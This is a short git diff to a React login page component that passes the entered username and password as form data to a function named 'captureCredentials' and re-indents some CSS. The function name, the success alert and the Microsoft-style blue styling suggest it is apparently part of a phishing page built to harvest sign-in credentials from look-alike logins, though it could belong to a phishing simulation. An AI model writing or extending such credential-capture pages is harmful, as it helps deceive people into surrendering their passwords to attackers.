@@ -38,8 +38,13 @@ export default function LoginPageClient() {
     event.preventDefault();
     setIsLoading(true);
     setShowErrorAlert(false);
+
+    const formData = new FormData();
+    formData.append('username', username);
+    formData.append('password', password);
+
     try {
-      const result = await captureCredentials({ username, password });
+      const result = await captureCredentials(null, formData);
       if (result.success) {
         setShowSuccessAlert(true);
       } else {
@@ -86,9 +91,9 @@ export default function LoginPageClient() {
           margin-bottom: 1rem;
         }
         .card h1 {
-          color: #0078D4;
-          font-size: 1.5rem;
-          margin-bottom: 1.5rem;
+            color: #0078D4;
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
         }
         input[type="text"],
         input[type="password"] {
